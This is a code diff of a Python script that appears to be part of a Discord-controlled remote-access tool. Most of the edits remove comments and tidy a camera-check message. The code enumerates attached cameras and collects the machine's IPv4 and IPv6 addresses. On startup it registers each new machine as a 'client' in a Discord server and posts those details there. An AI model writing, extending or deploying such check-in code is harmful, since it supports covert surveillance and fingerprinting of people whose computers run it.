@@ -29,17 +29,16 @@ import sys
 import win32gui, win32con
 
 def check_connected_cameras():
-    # Try to open the first few camera indices
-    camera_indices = range(10)  # Check up to 10 camera devices
+
+    camera_indices = range(10)
     connected_cameras = []
 
     for index in camera_indices:
-        # Try to open the camera
         cap = cv2.VideoCapture(index)
         
         if cap.isOpened():
-            connected_cameras.append(index)  # Add the index of the connected camera
-            cap.release()  # Release the camera
+            connected_cameras.append(index)
+            cap.release()
 
     return connected_cameras
 
@@ -48,17 +47,15 @@ def check_connected_cameras():
 def get_ipv6_address():
     hostname = socket.gethostname()
     
-    # Get all the addresses for the hostname (both IPv4 and IPv6)
     addr_info = socket.getaddrinfo(hostname, None, socket.AF_INET6)
     
-    # Filter and return the IPv6 address
     for addr in addr_info:
         ipv6_address = addr[4][0]
         return ipv6_address
     
 def get_device_ip4():
-    hostname = socket.gethostname()  # Get the local machine name
-    ip_address = socket.gethostbyname(hostname)  # Get the IP address from the hostname
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
     return ip_address
 
 
@@ -85,7 +82,7 @@ async def on_ready():
     for guild in client.guilds:
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
-        if not existing_category:  # If the category doesn't exist, create it
+        if not existing_category:
             await channel12.send("New client added to network, info:")
             category = await guild.create_category(str(ip))
             ipv6 = get_ipv6_address()
@@ -95,11 +92,11 @@ async def on_ready():
             if cameras:
                 pass
             else:
-                cameras = "No Cameras Found."
+                cameras = "No cameras found."
             await channel12.send(f"Mac address:{ip}")
             await channel12.send(f"Ipv6: {ipv6}")
             await channel12.send(f"Ipv4: {ipv4}")
-            if cameras:
+            if not cameras == "No cameras found.":
                 await channel12.send("Cameras: at least one found!")
             else:
                 await channel12.send("Cameras: no cameras found.")
